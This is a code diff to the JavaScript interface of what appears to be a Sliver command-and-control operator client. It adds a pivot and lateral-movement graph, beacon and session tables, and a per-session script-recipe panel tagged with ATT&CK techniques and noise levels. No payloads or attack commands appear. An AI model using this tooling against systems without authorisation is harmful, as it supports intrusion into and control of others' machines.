@@ -3,8 +3,11 @@ let selectedConfigPath = null, pollTimer = null, activeCtxAgent = null;
 let lastConfigPath = null, reconnectTimer = null, reconnecting = false;
 let teamserverLabel = 'teamserver';
 let allSessions = [], allBeacons = [];
+let pivotTree = [];                  // pivot topology from GetPivotGraph RPC
 // Graph interaction state (persists across refreshes).
 const graphPos = {};                 // agent id -> {x,y} in graph coords
+const graphDrag = {};                // agent id -> {x,y} dragged position override
+let graphEdges = [];                 // current edge list [{from,to}] for live drag redraws
 let graphView = { tx: 0, ty: 0, scale: 1 };
 let graphCenter = null;
 const openTabs = {};
@@ -154,6 +157,7 @@ async function enterApp(info) {
   wireEventStream();
   pinServerConsole();     // Server console docked by default
   pinEvents();            // Event Log docked in the console by default
+  pinScripts();           // Script Manager docked in the console by default
   refreshAgents();
   pollTimer = setInterval(refreshAgents, 5000);
 }
@@ -171,6 +175,11 @@ document.getElementById('disconnect-btn').addEventListener('click', async () => 
   for (const k in openTabs) delete openTabs[k];
   for (const k in notesMap) delete notesMap[k];
   for (const k in integrityMap) delete integrityMap[k];
+  // Clear transient graph state so jump lineage / drags don't leak into the next
+  // engagement (persisted per-teamserver graphPos is kept).
+  for (const k in jumpParentMap) delete jumpParentMap[k];
+  for (const k in graphDrag) delete graphDrag[k];
+  pivotTree = [];
   activeInteractId = null;
   allSessions = []; allBeacons = [];
   selectedConfigPath = null; cancelReconnect();
@@ -237,7 +246,8 @@ function renderTable() {
     const tr = document.createElement('tr'); tr.dataset.id = o.id; tr.dataset.kind = kind;
     if (isPrivileged(o) && !o.isDead) tr.classList.add('row-priv');
     const typeCls = kind === 'session' ? 'type-session' : 'type-beacon';
-    tr.innerHTML = `<td class="${typeCls}">${kind.toUpperCase()}</td><td>${esc(o.name||o.id.slice(0,8))}</td><td>${esc(o.hostname)}</td>${userCell(o)}<td>${esc(o.os)}/${esc(o.arch)}</td><td>${o.pid}</td><td>${esc(o.transport)}</td><td>${esc(o.remoteAddress)}</td><td>${esc(o.lastCheckin)}</td><td class="${o.isDead?'status-dead':'status-alive'}">${o.isDead?'DEAD':'ALIVE'}</td>`;
+    const remoteIP = o.remoteAddress ? o.remoteAddress.split(':')[0] : '-';
+    tr.innerHTML = `<td class="${typeCls}">${kind.toUpperCase()}</td><td>${esc(o.name||o.id.slice(0,8))}</td><td>${esc(o.hostname)}</td>${userCell(o)}<td>${esc(remoteIP)}</td><td>${esc(o.os)}/${esc(o.arch)}</td><td>${o.pid}</td><td>${esc(o.transport)}</td><td>${esc(o.lastCheckin)}</td><td class="${o.isDead?'status-dead':'status-alive'}">${o.isDead?'DEAD':'ALIVE'}</td>`;
     tr.addEventListener('dblclick', () => openInteract(kind, o));
     tr.addEventListener('contextmenu', e => showCtx(e, kind, o));
     body.appendChild(tr);
@@ -252,21 +262,42 @@ document.getElementById('view-graph-btn').addEventListener('click', () => { docu
 document.getElementById('graph-reset-btn').addEventListener('click', resetGraph);
 
 // ── Graph view (premium Cobalt-Strike style) ────────────────────────────────
-let pivotTree = [], graphEdges = [], graphDrag = {};
+// jumpParentMap tracks Jump / Spawn operations performed from session console or script manager
+// Format: jumpParentMap[targetHostOrIP] = { parentID, parentHost }
+const jumpParentMap = {};
 
-// buildPivotMaps flattens Sliver's pivot tree into child-session-id -> parent-
-// session-id. Keying on session id (unique) instead of hostname means pivot chains
-// on the SAME host (e.g. several runas'd sessions on one box) resolve correctly.
-// A relay node without a session passes its own parent down to its children.
+function recordJump(parentSessID, targetHost) {
+  if (!targetHost || !parentSessID) return;
+  const parentTab = openTabs[parentSessID];
+  const parentHost = (parentTab && parentTab.obj && parentTab.obj.hostname) ? parentTab.obj.hostname : '';
+  const record = { parentID: parentSessID, parentHost: parentHost };
+  jumpParentMap[targetHost] = record;
+  const cleanHost = targetHost.startsWith('[')
+    ? targetHost.substring(1, targetHost.indexOf(']'))
+    : targetHost.split(':')[0];
+  if (cleanHost && cleanHost !== targetHost) {
+    jumpParentMap[cleanHost] = record;
+  }
+}
+
+// buildPivotMaps flattens Sliver's pivot tree into sessionID/hostname -> parent mappings.
+// Prefers sessionID-based matching to correctly handle multiple sessions on the same host.
 function buildPivotMaps() {
-  const parentById = {};
-  const walk = (nd, parentId) => {
-    const id = nd.sessionId || null;
-    if (parentId && id) parentById[id] = parentId;
-    (nd.children || []).forEach(c => walk(c, id || parentId));
+  const parentOf   = {};  // hostname -> parent hostname
+  const parentOfID = {};  // sessionID -> parent sessionID
+  const walk = (nd, parentHost, parentSessID) => {
+    const host   = nd.hostname || nd.name || ('peer' + nd.peerId);
+    // JSON tag is "sessionId" (lowercase d) — reading nd.sessionID left this
+    // undefined, breaking the reliable per-session pivot matching and forcing a
+    // wrong hostname fallback (e.g. a pivot child attached to the root instead
+    // of its real parent).
+    const sessID = nd.sessionId || nd.sessionID || nd.id || null;
+    if (parentHost)              parentOf[host]     = parentHost;
+    if (sessID && parentSessID)  parentOfID[sessID] = parentSessID;
+    (nd.children || []).forEach(c => walk(c, host, sessID));
   };
-  (pivotTree || []).forEach(r => walk(r, null));
-  return { parentById };
+  (pivotTree || []).forEach(r => walk(r, null, null));
+  return { parentOf, parentOfID };
 }
 
 // edgeD builds a straight edge path shortened at both ends so the arrowhead sits
@@ -278,109 +309,207 @@ function edgeD(src, tgt, srcR, tgtR) {
   const bx = tgt.x - ux * tgtR, by = tgt.y - uy * tgtR;
   return `M${ax.toFixed(1)} ${ay.toFixed(1)} L${bx.toFixed(1)} ${by.toFixed(1)}`;
 }
-// edgeColor picks the line colour from the agent it points at: blue=beacon,
-// red=privileged session, green=normal session.
+
+// edgeColor picks the line colour from the agent it points at.
+// Jump edges are orange and handled separately in renderGraph.
 function edgeColor(nd) {
   if (!nd) return '#35c46b';
+  if (nd.obj && nd.obj.isDead) return '#6b7280';      // dead → grey (matches legend)
   if (nd.kind === 'beacon') return '#4d9fe6';
   return isPrivileged(nd.obj) ? '#e23c4e' : '#35c46b';
 }
 
-// renderGraph draws the pivot topology: a firewall egress boundary on the left,
-// green dashed edges to direct (egress) agents and orange edges down each pivot
-// chain (parent -> child), laid out left-to-right. Wrapped in try/catch so a data
-// hiccup can never blank the view.
+// renderGraph draws the pivot topology: firewall on left, coloured egress/pivot edges,
+// and orange bidirectional dashed lines for lateral-movement jumps.
 function renderGraph() {
   const svg = document.getElementById('graph-svg');
   if (!svg) return;
   try {
     const nodes = [
       ...allSessions.map(s => ({ kind:'session', obj:s })),
-      ...allBeacons.map(b => ({ kind:'beacon', obj:b })),
+      ...allBeacons.map(b  => ({ kind:'beacon',  obj:b })),
     ];
     const W = svg.clientWidth || 900, H = svg.clientHeight || 460;
     svg.setAttribute('viewBox', `0 0 ${W} ${H}`);
     const fwX = 74, fwY = H / 2;
 
-    // Resolve each node's pivot parent by SESSION ID (unique), so chains on the
-    // same host render as a real chain instead of collapsing on the hostname.
-    const nodeById = {}; nodes.forEach(nd => nodeById[nd.obj.id] = nd);
-    const { parentById } = buildPivotMaps();
-    const parentNodeId = {}, childIds = {};
+    // Build lookup maps
+    const nodeByHost = {}, nodeByID = {};
     nodes.forEach(nd => {
-      const pid = parentById[nd.obj.id];
-      if (pid && nodeById[pid] && pid !== nd.obj.id) {
-        parentNodeId[nd.obj.id] = pid;
-        (childIds[pid] = childIds[pid] || []).push(nd.obj.id);
+      const h = nd.obj.hostname; if (h && !nodeByHost[h]) nodeByHost[h] = nd;
+      nodeByID[nd.obj.id] = nd;
+    });
+
+    const { parentOf, parentOfID } = buildPivotMaps();
+    const parentNodeId = {}, jumpEdgeSet = new Set();
+
+    // ── Parent resolution — PIVOT is authoritative, JUMP is heuristic. ──
+    // Pass 1: pivot parents from Sliver's pivot graph (session-ID; then a GENUINE
+    // cross-host hostname fallback). These come straight from the teamserver and
+    // define the true topology (firewall → gateway → pivoted agent).
+    nodes.forEach(nd => {
+      let parentId = null;
+      const pByID = parentOfID[nd.obj.id];
+      if (pByID && nodeByID[pByID] && pByID !== nd.obj.id) parentId = pByID;
+      if (!parentId) {
+        const ph = parentOf[nd.obj.hostname];
+        if (ph && ph !== nd.obj.hostname) {
+          const cands = nodes.filter(n => n.obj.hostname === ph && n.obj.id !== nd.obj.id);
+          if (cands.length) parentId = cands[0].obj.id;
+        }
       }
+      if (parentId) parentNodeId[nd.obj.id] = parentId;
+    });
+
+    // wouldCycle: does linking child→parent loop back through the existing parents?
+    const wouldCycle = (childId, parentId) => {
+      let cur = parentId, hops = 0;
+      while (cur && hops++ <= nodes.length) { if (cur === childId) return true; cur = parentNodeId[cur]; }
+      return false;
+    };
+
+    // Pass 2: jump / lateral-move lineage — ONLY for agents that have no pivot
+    // parent, and NEVER if it would reverse/cycle a pivot chain. This is what
+    // stops a jump whose target IP collides with an existing same-host session
+    // (all agents on one box share an IP) from hijacking or flipping the tree.
+    nodes.forEach(nd => {
+      if (parentNodeId[nd.obj.id]) return;              // pivot already owns this node
+      let ipOnly = '';
+      if (nd.obj.remoteAddress) {
+        const raw = nd.obj.remoteAddress;
+        ipOnly = raw.startsWith('[') ? raw.substring(1, raw.indexOf(']')) : raw.split(':')[0];
+      }
+      const entry = jumpParentMap[nd.obj.hostname] ||
+                    (ipOnly ? jumpParentMap[ipOnly] : null) ||
+                    jumpParentMap[nd.obj.remoteAddress];
+      if (!entry) return;
+      const pID   = (typeof entry === 'object') ? entry.parentID   : entry;
+      const pHost = (typeof entry === 'object') ? entry.parentHost : null;
+      let parentId = null;
+      if (pID && pID !== nd.obj.id && nodeByID[pID] && !nodeByID[pID].obj.isDead) parentId = pID;
+      else if (pHost && pHost !== nd.obj.hostname) {
+        const ap = nodes.filter(n => n.obj.hostname === pHost && n.obj.id !== nd.obj.id && !n.obj.isDead);
+        if (ap.length) parentId = ap[0].obj.id;
+      }
+      if (parentId && !wouldCycle(nd.obj.id, parentId)) {
+        parentNodeId[nd.obj.id] = parentId;
+        jumpEdgeSet.add(`${parentId}:${nd.obj.id}`);
+      }
+    });
+
+    // Safety net: drop self-parents / parents that aren't real nodes.
+    nodes.forEach(nd => {
+      const p = parentNodeId[nd.obj.id];
+      if (p === nd.obj.id || (p && !nodeByID[p])) delete parentNodeId[nd.obj.id];
+    });
+
+    // Rebuild the children map from the validated parent links.
+    const kidsOf = {};
+    nodes.forEach(nd => {
+      const p = parentNodeId[nd.obj.id];
+      if (p) (kidsOf[p] = kidsOf[p] || []).push(nd.obj.id);
     });
     const roots = nodes.filter(nd => !parentNodeId[nd.obj.id]).map(nd => nd.obj.id);
 
-    // Hierarchical left-to-right layout: depth = column, each leaf gets its own row.
-    const layout = {}, colW = 192, rowH = 96;
-    let leaf = 0;
-    const place = (id, depth, seen) => {
-      if (seen[id]) return layout[id] ? layout[id].y : (60 + leaf * rowH);
-      seen[id] = 1;
-      const kids = (childIds[id] || []).filter(k => !seen[k]);
+    // Tidy left-to-right tree: x = depth column, y = leaf order (parents centred
+    // on the span of their children). rowH > node height so labels never overlap.
+    const layout = {}, colW = 200, rowH = 116, topPad = 50;
+    let row = 0;
+    const placed = {};
+    const place = (id, depth) => {
+      if (placed[id]) return layout[id] ? layout[id].y : topPad + row * rowH;
+      placed[id] = 1;
       const x = fwX + depth * colW;
+      const kids = (kidsOf[id] || []).filter(k => !placed[k]);
       let y;
-      if (!kids.length) { y = 60 + leaf * rowH; leaf++; }
-      else { const ys = kids.map(k => place(k, depth + 1, seen)); y = ys.reduce((a,b)=>a+b,0)/ys.length; }
+      if (!kids.length) { y = topPad + row * rowH; row++; }
+      else { const ys = kids.map(k => place(k, depth + 1)); y = (Math.min(...ys) + Math.max(...ys)) / 2; }
       layout[id] = { x, y };
       return y;
     };
-    const seen = {};
-    roots.forEach(r => place(r, 1, seen));
+    roots.forEach(r => place(r, 1));
+    nodes.forEach(nd => { if (!placed[nd.obj.id]) place(nd.obj.id, 1); });
+
+    // Vertically centre the whole tree in the viewport.
     const yvals = Object.values(layout).map(p => p.y);
     if (yvals.length) {
-      const mid = (Math.min(...yvals) + Math.max(...yvals)) / 2, shift = H/2 - mid;
-      Object.values(layout).forEach(p => p.y += shift);
+      const mid = (Math.min(...yvals) + Math.max(...yvals)) / 2;
+      const dy = H / 2 - mid;
+      Object.values(layout).forEach(p => p.y += dy);
     }
     svg._layout = layout; svg._fwX = fwX; svg._fwY = fwY;
-    const posOf = id => graphDrag[id] || layout[id] || { x: fwX + colW, y: H/2 };
-    const NODE_R = 30, FW_R = 34;
+    // Priority: live drag > persisted position > computed layout.
+    const posOf  = id => graphDrag[id] || graphPos[id] || layout[id] || { x: fwX + colW, y: H / 2 };
+    // Icon half-width is 26px; inset the arrows well past it on BOTH ends so
+    // every edge has the same clear, tidy gap before the node/firewall icon.
+    const NODE_R = 46, FW_R = 48;
 
-    // Edge list: firewall -> root (egress), parent -> child (pivot).
+    // Build edge list — firewall → every root, then parent → child.
     graphEdges = [];
-    roots.forEach(id => graphEdges.push({ from:'__fw__', to:id }));
-    nodes.forEach(nd => { const p = parentNodeId[nd.obj.id]; if (p) graphEdges.push({ from:p, to:nd.obj.id }); });
-
-    const fwPos = { x: fwX, y: fwY };
-    let html = '<defs>' +
-      '<marker id="ar-green" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#35c46b"/></marker>' +
-      '<marker id="ar-red" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#e23c4e"/></marker>' +
-      '<marker id="ar-blue" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="7" markerHeight="7" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#4d9fe6"/></marker>' +
-      '</defs>';
-    html += `<g id="g-root" transform="translate(${graphView.tx},${graphView.ty}) scale(${graphView.scale})">`;
-
-    // Solid edges, coloured by the agent they point at, arrowhead at the node edge.
-    graphEdges.forEach(ed => {
-      const src = ed.from === '__fw__' ? fwPos : posOf(ed.from), tgt = posOf(ed.to);
-      const col = edgeColor(nodeById[ed.to]);
-      const mk = col === '#4d9fe6' ? 'ar-blue' : (col === '#e23c4e' ? 'ar-red' : 'ar-green');
-      const eid = `ge-${ed.from}-${ed.to}`;
-      html += `<path id="${eid}" d="${edgeD(src, tgt, ed.from === '__fw__' ? FW_R : NODE_R, NODE_R + 3)}" stroke="${col}" stroke-width="2.4" fill="none" marker-end="url(#${mk})"/>`;
+    roots.forEach(id => graphEdges.push({ from:'__fw__', to:id, isJump:false }));
+    nodes.forEach(nd => {
+      const p = parentNodeId[nd.obj.id];
+      if (p) graphEdges.push({ from:p, to:nd.obj.id, isJump: jumpEdgeSet.has(`${p}:${nd.obj.id}`) });
     });
 
-    // Firewall (egress boundary): brick wall + flame.
+    const fwPos = { x: fwX, y: fwY };
+
+    // SVG defs — arrowheads for green/red/blue/orange
+    let html = '<defs>' +
+      '<marker id="ar-green"        viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#35c46b"/></marker>' +
+      '<marker id="ar-red"          viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#e23c4e"/></marker>' +
+      '<marker id="ar-blue"         viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#4d9fe6"/></marker>' +
+      '<marker id="ar-grey"         viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#6b7280"/></marker>' +
+      '<marker id="ar-orange-end"   viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6" markerHeight="6" orient="auto"><path d="M0 0 L10 5 L0 10 z" fill="#f5a623"/></marker>' +
+      '<marker id="ar-orange-start" viewBox="0 0 10 10" refX="1.5" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="#f5a623"/></marker>' +
+      '</defs>';
+
+    html += `<g id="g-root" transform="translate(${graphView.tx},${graphView.ty}) scale(${graphView.scale})">`;
+
+    // Draw edges
+    graphEdges.forEach(ed => {
+      const src  = ed.from === '__fw__' ? fwPos : posOf(ed.from);
+      const tgt  = posOf(ed.to);
+      const srcR = ed.from === '__fw__' ? FW_R : NODE_R;
+      const eid  = `ge-${ed.from}-${ed.to}`;
+      if (ed.isJump) {
+        html += `<path id="${eid}" d="${edgeD(src, tgt, srcR, NODE_R)}"
+          stroke="#f5a623" stroke-width="2.2" stroke-dasharray="9 5" fill="none"
+          marker-end="url(#ar-orange-end)" marker-start="url(#ar-orange-start)" opacity="0.92"/>`;
+      } else {
+        const col = edgeColor(nodeByID[ed.to]);
+        const mk  = col === '#4d9fe6' ? 'ar-blue' : col === '#e23c4e' ? 'ar-red' : col === '#6b7280' ? 'ar-grey' : 'ar-green';
+        html += `<path id="${eid}" d="${edgeD(src, tgt, srcR, NODE_R)}"
+          stroke="${col}" stroke-width="2.4" fill="none" marker-end="url(#${mk})"/>`;
+      }
+    });
+
+    // Firewall icon — brick wall + flame, NO text label
     html += `<g pointer-events="none" transform="translate(${fwX},${fwY})">`;
     const bw = 15, bh = 9;
-    for (let r = 0; r < 5; r++) { const oy = -22 + r*bh, off = (r%2) ? bw/2 : 0; for (let c = -1; c < 2; c++) html += `<rect x="${c*bw+off-7}" y="${oy}" width="${bw-1.5}" height="${bh-1.5}" fill="#9a3b2e" stroke="#5f231b" stroke-width="0.8"/>`; }
-    html += '<text x="-19" y="7" font-size="30" text-anchor="middle">🔥</text>';
-    html += '<text y="42" text-anchor="middle" fill="var(--muted)" font-size="9" font-family="var(--mono)">egress</text>';
+    for (let r = 0; r < 5; r++) {
+      const oy = -22 + r * bh, off = (r % 2) ? bw / 2 : 0;
+      for (let c = -1; c < 2; c++)
+        html += `<rect x="${c*bw+off-7}" y="${oy}" width="${bw-1.5}" height="${bh-1.5}" fill="#9a3b2e" stroke="#5f231b" stroke-width="0.8"/>`;
+    }
+    html += '<text x="-19" y="7" font-size="30" text-anchor="middle">\uD83D\uDD25</text>';
     html += '</g>';
 
-    // Agent nodes: icon (blue=user, red=privileged), lightning bolts when privileged.
+    // Agent nodes
     nodes.forEach(nd => {
-      const o = nd.obj, p = posOf(o.id), dead = o.isDead, priv = isPrivileged(o);
-      html += `<g class="gnode${dead?' dead':''}" data-id="${esc(o.id)}" transform="translate(${p.x},${p.y})" style="cursor:grab">`;
+      const o    = nd.obj, p = posOf(o.id), dead = o.isDead, priv = isPrivileged(o);
+      const isJumpRelated = jumpEdgeSet.size > 0 &&
+        [...jumpEdgeSet].some(k => k.startsWith(o.id + ':') || k.endsWith(':' + o.id));
+      html += `<g class="gnode${dead ? ' dead' : ''}" data-id="${esc(o.id)}" transform="translate(${p.x},${p.y})" style="cursor:grab">`;
       html += '<rect x="-30" y="-34" width="60" height="94" fill="transparent"/>';
-      if (o.id === activeInteractId) html += '<rect x="-33" y="-33" width="66" height="64" rx="4" fill="none" stroke="#35c46b" stroke-width="1.5" stroke-dasharray="5 4"/>';
+      if (o.id === activeInteractId)
+        html += '<rect x="-33" y="-33" width="66" height="64" rx="4" fill="none" stroke="#35c46b" stroke-width="1.5" stroke-dasharray="5 4"/>';
+      else if (isJumpRelated)
+        html += '<rect x="-33" y="-33" width="66" height="64" rx="4" fill="none" stroke="#f5a623" stroke-width="1.2" stroke-dasharray="6 4" opacity="0.65"/>';
       html += `<image href="${osIconHref(o.os, priv, dead)}" x="-26" y="-26" width="52" height="52" pointer-events="none"/>`;
       const user = shortUser(o.username) + (priv && !dead ? ' *' : '');
-      const l2 = `${o.hostname || o.id.slice(0,6)}${o.pid ? ' @ ' + o.pid : ''}`;
-      const lc = dead ? 'var(--muted)' : (priv ? 'var(--accent)' : 'var(--text)');
+      const l2   = `${o.hostname || o.id.slice(0, 6)}${o.pid ? ' @ ' + o.pid : ''}`;
+      const lc   = dead ? 'var(--muted)' : (priv ? 'var(--accent)' : 'var(--text)');
       html += `<text y="40" text-anchor="middle" fill="${lc}" font-size="10" font-weight="bold" font-family="var(--font)" pointer-events="none">${esc(user)}</text>`;
       html += `<text y="51" text-anchor="middle" fill="var(--muted)" font-size="8.5" font-family="var(--mono)" pointer-events="none">${esc(l2)}</text>`;
       if (dead) html += '<text y="-30" text-anchor="middle" fill="var(--muted)" font-size="8" font-weight="bold" font-family="var(--mono)" pointer-events="none">DEAD</text>';
@@ -399,8 +528,9 @@ function renderGraph() {
   } catch (err) { console.error('renderGraph failed:', err); }
 }
 
-// setupGraphInteraction wires node drag, canvas pan and wheel zoom. Attached once
-// per svg element; reads live layout/firewall coords off the svg each render.
+// setupGraphInteraction wires node drag, canvas pan and wheel zoom.
+// Guards with svg._wired so it only sets up once per SVG lifetime.
+// Call svg._wired = false before renderGraph() when you need a fresh setup (e.g. resetGraph).
 function setupGraphInteraction(svg) {
   if (svg._wired) return;
   svg._wired = true;
@@ -410,7 +540,7 @@ function setupGraphInteraction(svg) {
     const root = document.getElementById('g-root');
     if (root) root.setAttribute('transform', `translate(${graphView.tx},${graphView.ty}) scale(${graphView.scale})`);
   };
-  const posOf = id => graphDrag[id] || (svg._layout && svg._layout[id]) || { x: (svg._fwX||74) + 192, y: svg._fwY || 0 };
+  const posOf = id => graphDrag[id] || graphPos[id] || (svg._layout && svg._layout[id]) || { x: (svg._fwX||74) + 200, y: svg._fwY || 0 };
 
   svg.addEventListener('mousedown', e => {
     const nodeEl = e.target.closest('.gnode');
@@ -438,7 +568,7 @@ function setupGraphInteraction(svg) {
         if (ed.from !== dragId && ed.to !== dragId) return;
         const src = ed.from === '__fw__' ? { x: svg._fwX, y: svg._fwY } : posOf(ed.from), tgt = posOf(ed.to);
         const el = document.getElementById(`ge-${ed.from}-${ed.to}`);
-        if (el) el.setAttribute('d', edgeD(src, tgt, ed.from === '__fw__' ? 34 : 30, 33));
+        if (el) el.setAttribute('d', edgeD(src, tgt, ed.from === '__fw__' ? 48 : 46, 46));
       });
     } else if (mode === 'pan') {
       graphView.tx = origX + (e.clientX - startX);
@@ -449,7 +579,11 @@ function setupGraphInteraction(svg) {
 
   document.addEventListener('mouseup', () => {
     if (mode === 'pan') svg.style.cursor = '';
-    if (mode === 'node') { const g = svg.querySelector(`.gnode[data-id="${CSS.escape(dragId)}"]`); if (g) g.style.cursor = 'grab'; }
+    if (mode === 'node' && dragId) {
+      const g = svg.querySelector(`.gnode[data-id="${CSS.escape(dragId)}"]`); if (g) g.style.cursor = 'grab';
+      // Persist the dragged position so it survives refresh / reconnect.
+      if (graphDrag[dragId]) { graphPos[dragId] = { ...graphDrag[dragId] }; saveState(); }
+    }
     mode = null; dragId = null;
   });
 
@@ -467,12 +601,17 @@ function setupGraphInteraction(svg) {
 }
 
 // Reset the graph layout/view to its default.
+// Clears all dragged positions, resets pan/zoom, and forces interaction re-init.
 function resetGraph() {
-  for (const k in graphPos) delete graphPos[k];
+  for (const k in graphPos)  delete graphPos[k];
   for (const k in graphDrag) delete graphDrag[k];
-  graphView = { tx: 0, ty: 0, scale: 1 };
+  graphView  = { tx: 0, ty: 0, scale: 1 };
   graphCenter = null;
-  renderGraph();
+  saveState();               // persist the cleared layout so it sticks
+  // Do NOT reset svg._wired — the pan/drag/zoom listeners are delegated on the
+  // svg/document and survive re-renders. Re-wiring would stack duplicate handlers.
+  renderGraph();             // re-renders with cleared drags + reset pan/zoom
+  toast('ok', 'Graph layout reset');
 }
 
 // ── Context menu ───────────────────────────────────────────────────────────
@@ -542,7 +681,34 @@ function openInteract(kind, obj) {
     : `[session] ${obj.id.slice(0,8)} - ${obj.hostname} (${obj.os}/${obj.arch}) - ${obj.username}\n` +
       `[info] Interactive session. Commands execute immediately.\n` +
       `[info] Type 'help' for available commands.\n`;
-  panel.innerHTML = `<div class="console-out" id="cout-${id}"><span class="info">${esc(helpText)}</span></div><div class="console-in"><span class="console-prompt">${esc(promptStr)} </span><input class="console-input" id="cinp-${id}" placeholder="type a command..." autocomplete="off"/></div>`;
+  panel.innerHTML = `
+    <div class="console-script-bar" id="csb-${id}">
+      <div class="csb-header">
+        <div class="csb-title">
+          <span class="csb-badge">SCRIPTS</span>
+          <span class="csb-target">Pivot: ${esc(obj.hostname || obj.id.slice(0,8))} (${obj.os}/${obj.arch})</span>
+        </div>
+        <div class="csb-cats" id="csb-cats-${id}"></div>
+        <button class="csb-toggle-btn" id="csb-toggle-${id}">Hide Scripts</button>
+      </div>
+      <div class="csb-body" id="csb-body-${id}">
+        <div class="csb-grid" id="csb-recipes-${id}"></div>
+        <div class="csb-card" id="csb-card-${id}" style="display:none">
+          <div class="csb-card-header">
+            <h4 id="csb-card-title-${id}"></h4>
+            <p id="csb-card-desc-${id}"></p>
+          </div>
+          <div class="csb-form-grid" id="csb-form-${id}"></div>
+          <div class="csb-actions">
+            <button class="csb-btn csb-btn-preview" id="csb-btn-prev-${id}">Preview / Dry-Run</button>
+            <button class="csb-btn csb-btn-exec" id="csb-btn-exec-${id}">Execute Recipe</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="console-out" id="cout-${id}"><span class="info">${esc(helpText)}</span></div>
+    <div class="console-in"><span class="console-prompt">${esc(promptStr)} </span><input class="console-input" id="cinp-${id}" placeholder="type a command..." autocomplete="off"/></div>
+  `;
   document.getElementById('interact-panels').appendChild(panel);
   // Wire input
   const inp = document.getElementById(`cinp-${id}`);
@@ -552,7 +718,257 @@ function openInteract(kind, obj) {
     if (e.key === 'ArrowUp') { if (hIdx < hist.length-1) { hIdx++; inp.value = hist[hIdx]; } e.preventDefault(); }
     if (e.key === 'ArrowDown') { if (hIdx > 0) { hIdx--; inp.value = hist[hIdx]; } else { hIdx=-1; inp.value=''; } e.preventDefault(); }
   });
+  attachConsoleScriptManager(id, kind, obj);
   activateTab(id);
+}
+
+function attachConsoleScriptManager(id, kind, obj) {
+  const catsEl = document.getElementById(`csb-cats-${id}`);
+  const gridEl = document.getElementById(`csb-recipes-${id}`);
+  const cardEl = document.getElementById(`csb-card-${id}`);
+  const cardTitle = document.getElementById(`csb-card-title-${id}`);
+  const cardDesc = document.getElementById(`csb-card-desc-${id}`);
+  const formEl = document.getElementById(`csb-form-${id}`);
+  const btnPrev = document.getElementById(`csb-btn-prev-${id}`);
+  const btnExec = document.getElementById(`csb-btn-exec-${id}`);
+  const toggleBtn = document.getElementById(`csb-toggle-${id}`);
+  const csbBody = document.getElementById(`csb-body-${id}`);
+
+  let activeCat = 'All';
+  let activeScript = null;
+  let allScriptList = [];
+
+  toggleBtn?.addEventListener('click', () => {
+    const isHidden = csbBody.style.display === 'none';
+    csbBody.style.display = isHidden ? 'block' : 'none';
+    toggleBtn.textContent = isHidden ? 'Hide Scripts' : 'Show Scripts';
+  });
+
+  App().ListScripts().then(scripts => {
+    const targetOS = (obj.os || 'windows').toLowerCase();
+    allScriptList = (scripts || []).filter(s => {
+      if (!s.targetOS || s.targetOS === 'all') return true;
+      return targetOS.includes(s.targetOS);
+    });
+    const cats = ['All'];
+    allScriptList.forEach(s => { if (!cats.includes(s.category)) cats.push(s.category); });
+
+    catsEl.innerHTML = cats.map(c => `<button class="csb-cat-tab ${c === 'All' ? 'active' : ''}" data-cat="${esc(c)}">${esc(c)}</button>`).join('');
+    catsEl.querySelectorAll('.csb-cat-tab').forEach(tb => {
+      tb.addEventListener('click', () => {
+        catsEl.querySelectorAll('.csb-cat-tab').forEach(x => x.classList.remove('active'));
+        tb.classList.add('active');
+        activeCat = tb.dataset.cat;
+        renderRecipes();
+      });
+    });
+
+    renderRecipes();
+  }).catch(() => {});
+
+  function renderRecipes() {
+    gridEl.innerHTML = '';
+    const filtered = activeCat === 'All' ? allScriptList : allScriptList.filter(s => s.category === activeCat);
+    filtered.forEach(s => {
+      const btn = document.createElement('button');
+      btn.className = `csb-recipe-btn ${activeScript && activeScript.method === s.method ? 'active' : ''}`;
+      const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
+      const opsecClass = (s.opsec || 'low').toLowerCase();
+      const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)}</span>` : '';
+      btn.innerHTML = `<span>${esc(s.name)}</span> ${attckBadge} ${opsecBadge}`;
+      btn.title = s.description;
+      btn.addEventListener('click', () => selectRecipe(s));
+      gridEl.appendChild(btn);
+    });
+  }
+
+  function selectRecipe(s) {
+    activeScript = s;
+    renderRecipes();
+
+    const attckBadge = s.attck ? `<span class="badge-attck">${esc(s.attck)}</span>` : '';
+    const opsecClass = (s.opsec || 'low').toLowerCase();
+    const opsecBadge = s.opsec ? `<span class="badge-opsec opsec-${opsecClass}">${esc(s.opsec)} Noise</span>` : '';
+    cardTitle.innerHTML = `${esc(s.name)} ${attckBadge} ${opsecBadge}`;
+    cardDesc.textContent = s.description;
+
+    formEl.innerHTML = '';
+    if (s.params && s.params.length > 0) {
+      s.params.forEach(p => {
+        const field = document.createElement('div');
+        let inputHtml = '';
+        if (p.type === 'select') {
+          const optsHtml = (p.options || []).map(o => `<option value="${esc(o)}" ${o === p.default ? 'selected' : ''}>${esc(o)}</option>`).join('');
+          inputHtml = `<select id="csb-f-${id}-${esc(p.name)}" class="scr-input">${optsHtml}</select>`;
+        } else {
+          const inputType = p.type === 'password' ? 'password' : (p.type === 'number' ? 'number' : 'text');
+          const val = p.default || '';
+          const ph = p.placeholder || '';
+          inputHtml = `<input id="csb-f-${id}-${esc(p.name)}" type="${inputType}" class="scr-input" value="${esc(val)}" placeholder="${esc(ph)}" />`;
+        }
